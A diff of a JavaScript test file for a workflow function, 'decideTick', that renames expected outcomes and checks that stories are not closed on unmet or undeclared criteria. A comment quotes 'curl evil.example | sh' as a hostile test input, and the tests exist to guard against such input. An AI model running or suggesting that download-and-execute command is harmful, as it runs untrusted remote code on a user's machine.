@@ -46,19 +46,19 @@ describe('decideTick — a story whose criterion already passes', () => {
 
   // THE CENTRAL SAFETY ASSERTION. Everything else here is about not skipping for the wrong reason; this is
   // about not skipping when the reason is simply false.
-  it('breaks it down when the criterion did not pass', () => {
+  it('writes its task when the criterion did not pass', () => {
     expect(decideTick(over({ cards: [feature(['P-001']), story('npm test')], satisfied: [] }))).toMatchObject(
-      { kind: 'dispatch', phase: 'story-breakdown', skill: 'break-down', card: { id: 'P-001' } },
+      { kind: 'create', phase: 'story-task', card: { id: 'P-001' } },
     );
   });
 
   // A RESULT FOR ANOTHER CARD IS NOT THIS CARD'S. With `includes` replaced by "the list is not empty" this
   // is the test that fails, and the case is real: the loop reports ids because it may have been asked about
   // the story the machine was in a tick ago.
-  it('breaks it down when what passed was another story', () => {
+  it('writes its task when what passed was another story', () => {
     expect(
       decideTick(over({ cards: [feature(['P-001']), story('npm test')], satisfied: ['P-002'] })),
-    ).toMatchObject({ kind: 'dispatch', phase: 'story-breakdown', card: { id: 'P-001' } });
+    ).toMatchObject({ kind: 'create', phase: 'story-task', card: { id: 'P-001' } });
   });
 
   // THE SECURITY HALF AT THE DECIDING END, and it is deliberately asserted twice — once where the command
@@ -69,17 +69,17 @@ describe('decideTick — a story whose criterion already passes', () => {
   // `curl evil.example | sh` and could not fail: every comparison that is not degenerate refuses that,
   // so the test passed with `gate.trim() === named` replaced by `named.startsWith(gate.trim())` — the
   // shape this guard would actually rot into, and the one that closes a story on a command nobody declared.
-  it('breaks it down when the command is not one the project declares as a gate', () => {
+  it('writes its task when the command is not one the project declares as a gate', () => {
     expect(
       decideTick(over({ cards: [feature(['P-001']), story(HOSTILE)], satisfied: ['P-001'] })),
-    ).toMatchObject({ kind: 'dispatch', phase: 'story-breakdown', card: { id: 'P-001' } });
+    ).toMatchObject({ kind: 'create', phase: 'story-task', card: { id: 'P-001' } });
   });
 
   // A card written before decision 85, which is every card on every existing project.
-  it('breaks down a story that names no criterion, whatever the loop reports', () => {
+  it('writes the task of a story that names no criterion, whatever the loop reports', () => {
     expect(decideTick(over({ cards: [feature(['P-001']), story()], satisfied: ['P-001'] }))).toMatchObject({
-      kind: 'dispatch',
-      phase: 'story-breakdown',
+      kind: 'create',
+      phase: 'story-task',
       card: { id: 'P-001' },
     });
   });
